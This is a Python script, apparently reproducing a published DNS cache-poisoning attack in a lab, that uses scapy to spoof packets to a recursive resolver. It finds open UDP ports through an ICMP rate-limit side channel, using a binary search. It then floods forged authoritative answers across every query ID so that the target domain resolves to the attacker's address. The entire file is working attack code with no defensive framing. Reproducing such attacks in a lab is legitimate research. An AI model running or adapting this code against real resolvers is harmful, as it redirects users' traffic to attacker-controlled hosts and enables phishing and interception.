#import os
#os.sys.path.append("/home/attacker/.local/bin")
import random
from scapy.all import *
import time
import string
import math

target_domain = "site.dummy.com"
target_resolver_ip = '192.168.16.130'
attacker_ip = '192.168.16.158'
target_auth_ip = '192.168.16.150'

MAX_PORT_NUM = 65535
GLOBAL_ICMP_LIMIT = 50
GLOBAL_ICMP_REFRESH = .05
RESERVED_PORTS = 1024
PER_IP_REFRESH = 1
# j is the port number being tested. It needs to be global so that the
# Asynchronous sniffer handler can process it if it's open
# Cache is the list of open ports detected through the ICMP side-channel
# attack described in the paper.
# found_open_port is a boolean which is used in the binary search
# binary_initiated indicates that the code is transitioning from finding open
# blocks of ports to using binary search to find the exact port numbers
j = MAX_PORT_NUM
cache = []
found_open_port = False
binary_initiated = False


# We need to generate random strings so we can query
# uncached resources a la Kaminsky's method
def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


# In order to get packets out quickly enough, we write the
# packets raw. This function creates the raw IP headers from
# scapy packets.
def make_header(pkt):
    raw_pkt = bytearray(raw(pkt))
    return struct.pack(
        "!4s4sHH",
        inet_pton(socket.AF_INET, pkt["IP"].src),
        inet_pton(socket.AF_INET, pkt["IP"].dst),
        socket.IPPROTO_UDP,
        len(raw_pkt[34:]),
    )


# When our asynchronous packet sniffer detects an ICMP error message,
# this function is called. Depending on whether we are executing a binary search
# or just the general port scan, it reports back about open ports it has found
def pkt_callback(pkt):
    global found_open_port
    if binary_initiated:
        found_open_port = True
    else:
        h = math.floor(j / GLOBAL_ICMP_LIMIT) * GLOBAL_ICMP_LIMIT
        cache.append(h)


# This function takes in a byte array frame, a raw IP/ETH header,
# and a destination port and creates a raw DNS packet
def patch_sport(pkt, pseudo_hdr, dport):
    # write new destination port
    pkt[36] = (dport >> 8) & 0xFF
    pkt[37] = dport & 0xFF

    # reset checksum
    pkt[40] = 0x00
    pkt[41] = 0x00

    # calc new checksum
    ck = checksum(pseudo_hdr + pkt[34:])
    if ck == 0:
        ck = 0xFFFF
    cs = struct.pack("!H", ck)
    pkt[40] = cs[0]
    pkt[41] = cs[1]


# This function is like the one above, except it also takes in a DNS QID and
# a query domain string
def patch(pkt, pseudo_hdr, dport, qid, dns_qd):
    """Adjust the DNS id and patch_sport the UDP checksum within the given Ethernet frame"""
    # set destination port
    # the byte offsets can be found in Wireshark
    pkt[36] = (dport >> 8) & 0xFF
    pkt[37] = dport & 0xFF

    # reset checksum
    pkt[40] = 0x00
    pkt[41] = 0x00

    # set qid
    pkt[42] = (qid >> 8) & 0xFF
    pkt[43] = qid & 0xFF

    # set DNS QD
    pkt[55] = ord(dns_qd[3])
    pkt[56] = (ord(dns_qd[0])) & 0xFF
    pkt[57] = (ord(dns_qd[1])) & 0xFF
    pkt[58] = ord(dns_qd[2]) & 0xFF

    # calc new checksum
    ck = checksum(pseudo_hdr + pkt[34:])
    if ck == 0:
        ck = 0xFFFF
    cs = struct.pack("!H", ck)
    pkt[40] = cs[0]
    pkt[41] = cs[1]


# This is the meat of the program. It uses an ICMP side-channel to find which
# UDP ports are currently open
def find_ports():
    global j, binary_initiated, found_open_port, cache
    open_ports = []
    cache = []
    found_open_port = False
    binary_initiated = False
    j = MAX_PORT_NUM

    # After we saturate the global limit, we send a verification packet from the attacker
    # address to see if there were any open ports in the range we tested
    verification_pkt = Ether() / IP(src=attacker_ip, dst=target_resolver_ip) / UDP(sport=53, dport=1)
    pseudo_verif_hdr = make_header(verification_pkt)
    verification_pkt = bytearray(raw(verification_pkt))

    # We will test each port on the recursive resolver to check if it's open
    pkt = Ether() / IP(src=target_auth_ip, dst=target_resolver_ip) / UDP(sport=53, dport=0)
    pseudo_hdr = make_header(pkt)
    pkt = bytearray(raw(pkt))
    s = conf.L2socket()

    # We use an async sniffer to detect ICMP error messages
    t = AsyncSniffer(iface="ens3", prn=pkt_callback, store=False, filter="icmp")
    t.start()
    j = MAX_PORT_NUM
    while j > RESERVED_PORTS:
        for i in range(GLOBAL_ICMP_LIMIT):
            j -= 1
            patch_sport(pkt, pseudo_hdr, j)
            s.send(pkt)
        patch_sport(pkt, pseudo_verif_hdr, random.randint(1, 10))
        s.send(verification_pkt)
        time.sleep(GLOBAL_ICMP_REFRESH)

    # Now, we iterate through the list of possible ranges where there are open ports, using binary search
    # to locate the exact ports which are open
    binary_initiated = True
    dummy_pkt = bytearray(raw(Ether() / IP(src=target_auth_ip, dst=target_resolver_ip) / UDP(sport=53, dport=1)))
    for i in cache:
        old_range = 100
        current_range = GLOBAL_ICMP_LIMIT
        current_start = i
        while current_range > 0:
            for ports in range(GLOBAL_ICMP_LIMIT):
                # In order to tell if a port is in a certain range, we need to
                # saturate the global icmp rate limit. To do so, we send dummy
                # packets to a port on the recursive resolver which we know
                # in advanced to be closed (in this case port 1)
                if ports >= current_range:
                    s.send(dummy_pkt)
                else:
                    patch_sport(pkt, pseudo_hdr, current_start + ports)
                    s.send(pkt)
            s.send(verification_pkt)
            # We need to wait a moment to make sure no ICMP message was sent back
            time.sleep(.01)
            if found_open_port:
                old_range = current_range
                current_range = int(current_range / 2)
                found_open_port = False
            else:
                if old_range == 50 and current_range == 50:
                    break
                current_start += current_range
                current_range = old_range - current_range
                old_range = current_range
                current_range = int(current_range / 2)
            # We sleep to prevent burst rate-limit from tipping
            time.sleep(.05)
        open_ports.append(current_start)
        time.sleep(1)
    t.stop()
    return open_ports


# Finally, we iterate through the open ports we found and iterate through QID
query = Ether() / IP(src=attacker_ip, dst=target_resolver_ip) / \
        UDP(sport=50000, dport=53) / \
        DNS(id=50000, qd=DNSQR(qname="fill." + target_domain + "."), rd=1)
response = Ether() / IP(src=target_auth_ip, dst=target_resolver_ip) / \
           UDP(sport=53, dport=50000) / \
           DNS(id=50000, qd=DNSQR(qname="fill." + target_domain + "."), aa=1, qr=1,
               an=DNSRR(rrname=target_domain + ".", ttl=36000, rdata=attacker_ip))

dns_response_frame = bytearray(raw(response))

query_header = make_header(query)
response_header = make_header(response)
s = conf.L2socket()
while True:
    d_str = get_random_string(4) + "." + target_domain + "."
    query[DNS].qd = DNSQR(qname=d_str)

    # The commented code is for debug mode, where we have the target resolver
    # directly dig an authoritative nameserver to simulate the action of
    # recursion on behalf of the attacker.
    # d_str = target_domain+"."
    # s.send(query)
    ports = find_ports()
    for i in ports:
        for qid in range(RESERVED_PORTS, MAX_PORT_NUM):
            patch(dns_response_frame, response_header, i, qid, d_str)
            s.send(dns_response_frame)
